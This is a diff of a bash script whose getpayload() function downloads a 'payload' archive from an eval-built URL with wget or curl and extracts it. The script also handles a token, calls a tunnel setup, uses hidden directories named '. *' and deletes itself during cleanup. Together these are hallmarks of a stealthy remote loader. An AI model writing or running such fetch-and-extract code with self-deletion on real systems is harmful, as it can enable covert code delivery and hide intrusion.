@@ -3,6 +3,7 @@
 
 ## load customization variables
 [ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh) && rm -f env.sh
+STARTING_VARS=$(printf '%s' "$STARTING_VARS pl_mask=$pl_mask pl_ep=$pl_ep pl_token=$pl_token pl_name=$pl_name")
 STARTING_PATH=${STARTING_PATH:-$PATH}
 STARTING_PID=$BASHPID
 
@@ -55,8 +56,9 @@ getpayload(){
     type unzip &>/dev/null && format=".zip" extract="unzip -q" || format=".tar.gz" extract="tar xf"
     type wget &>/dev/null && fetch="wget -q" || fetch="curl -sOL"
     uri="$(eval "echo ${mask//:/$}${format}")"
+    # echo "$fetch $uri $extract $name $format" >/tmp/wat
     $fetch "$uri"
-    $extract "$name" && rm "${name}${format}" || { echo "problems with payload." && exit 1; }
+    $extract "${name}${format}" && rm "${name}${format}" || { echo "problems with payload." && exit 1; }
     # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
     # cd ${REPO}-${BRANCH} || exit 1
 }
@@ -109,7 +111,7 @@ setup_tnl
 ## removing tmppath too early might be a race cond, let it be called by switch
 cleanup() {
     ppath="${tmppath%\/*}"
-    previouspaths="$(compgen -G "$ppath"/.\ \*)"
+    previouspaths="$(compgen -G "${ppath}/.\ *")"
     cd "$ppath"
     rm -rf "$tmppath" "scripts-${BRANCH}" \
        -- "$0" \
